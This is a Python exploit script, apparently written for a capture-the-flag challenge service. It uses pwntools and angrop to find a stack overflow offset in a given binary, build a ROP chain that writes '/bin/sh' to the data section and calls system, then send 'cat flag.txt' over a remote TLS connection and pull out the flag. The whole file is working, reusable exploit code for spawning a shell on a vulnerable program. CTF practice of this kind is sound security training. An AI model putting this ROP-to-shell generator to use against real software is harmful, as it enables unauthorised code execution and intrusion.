from pwn import *
import angr, angrop
import detection
import re

context.update(
    arch="amd64",
    endian="little",
    log_level="warning",
    os="linux",
    # terminal=["tmux", "split-window", "-h", "-p 65"]
    terminal=["st"]
)


# REQUIRES ANGR AND ANGRROP TO BE INSTALLED
# INITIAL CALL SHOULD BE exploit(binary,False, 1)
def exploit(binary: str, movaps, times):
    flag_regex = r'flag\{[^}]+\}'

    url = f'ace-service-{binary}.chals.io'
    s = remote(url, 443, ssl=True, sni=url)
    # s = process(binary)
    if s:
        print('[+] Connected to host')

    offset = detection.find_rip_offset(binary)
    print("[+] Offset:", offset)


    # find writable mem
    # put bin/sh/00 in writable meme
    # put pointer to above in rdi
    # call system

    e = ELF(binary)
    r = ROP(e)

    ret = r.find_gadget(['ret'])[0]
    p = angr.Project(binary)

    ropy = p.analyses.ROP()
    ropy.find_gadgets()
    data_section = e.get_section_by_name('.data').header.sh_addr
    chain = ropy.write_to_mem(data_section, b"/bin/sh\0").payload_str()

    chain += ropy.set_regs(rdi=data_section).payload_str()
    if movaps:
        chain += p64(ret)
    chain += p64(e.sym['system'])

    print(cyclic(offset)+chain) #
    s.sendline(cyclic(offset) + chain)
    s.sendline(b'cat flag.txt')
    output = s.recvall(timeout=5)
    print(output)
    flag = re.findall(flag_regex, output.decode())
    if flag:
        return flag[0]
    elif times != 0:
        # second run around to avoid movaps
        #movaps = True
        return exploit(binary,True, 0)
    else:
        return None
